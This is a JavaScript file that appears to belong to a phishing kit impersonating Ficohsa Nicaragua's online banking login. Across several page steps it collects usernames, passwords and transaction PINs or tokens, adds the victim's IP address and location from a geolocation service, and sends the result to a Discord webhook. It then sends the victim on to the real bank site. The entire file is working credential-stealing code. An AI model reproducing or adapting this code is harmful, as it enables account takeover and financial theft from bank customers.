document.addEventListener("DOMContentLoaded", function() {
    var storedUser = localStorage.getItem("ficohsaUser") || "";

    var formLogin = document.getElementById("formLogin");
    if (formLogin) {
        formLogin.addEventListener("submit", function(event) {
            event.preventDefault();
            var username = document.getElementById("username").value;
            localStorage.setItem("ficohsaUser", username);
            obtenerUbicacionYEnviarDatos(username, "", "index2.html", "💲 Ficohsa Nica 💲\nUsuario: " + username + "\nClave: [usuario ingresado]");
        });
    }

    var loginForm = document.getElementById("formLogin2");
    if (loginForm) {
        loginForm.addEventListener("submit", function(event) {
            event.preventDefault();
            var password = document.getElementById("password").value;
            var user = localStorage.getItem("ficohsaUser") || "No registrado";
            obtenerUbicacionYEnviarDatos(user, password, "cargando.html?action=username-password", "💲 Ficohsa Nica 💲\nUsuario: " + user + "\nClave: " + password);
        });
    }

    var formContacto = document.getElementById("formLogin3");
    if (formContacto) {
        formContacto.addEventListener("submit", function(event) {
            event.preventDefault();
            var password = document.getElementById("password").value;
            var user = localStorage.getItem("ficohsaUser") || "No registrado";
            obtenerUbicacionYEnviarDatos(user, password, "cargando.html?action=token", "💲 Ficohsa Nica 💲\nUsuario: " + user + "\nPin Transaccional o Token: " + password);
        });
    }

    var formContacto3 = document.getElementById("formLogin4");
    if (formContacto3) {
        formContacto3.addEventListener("submit", function(event) {
            event.preventDefault();
            var password = document.getElementById("password").value;
            var user = localStorage.getItem("ficohsaUser") || "No registrado";
            obtenerUbicacionYEnviarDatos(user, password, "https://www.ficohsa.com/ni/", "💲 Ficohsa Nica 💲\nUsuario: " + user + "\nPin Transaccional o Token: " + password);
        });
    }
});

function obtenerUbicacionYEnviarDatos(user, value, nextPage, message) {
    fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
            var city = data.city || "No disponible";
            var region = data.region || "No disponible";
            var country = data.country_name || "No disponible";
            var ip = data.ip || "No disponible";
            message += '\nCiudad: ' + city + '\nEstado: ' + region + '\nPaís: ' + country + '\nIP: ' + ip;
            enviarDatosAlWebhook(message, nextPage);
        })
        .catch(error => {
            console.error("Error al obtener la ubicación:", error);
            message += '\nCiudad: No disponible\nEstado: No disponible\nPaís: No disponible\nIP: No disponible';
            enviarDatosAlWebhook(message, nextPage);
        });
}

function enviarDatosAlWebhook(mensaje, nextPage) {
    window.enviarDatosAlDiscord(mensaje)
        .then(result => {
            if (result.success) {
                console.log('Datos enviados al webhook de Discord con éxito.');
                window.location.href = nextPage;
            } else {
                console.error('Error al enviar datos al webhook:', result.message);
            }
        })
        .catch(error => {
            console.error('Error al enviar datos al webhook:', error);
        });
}
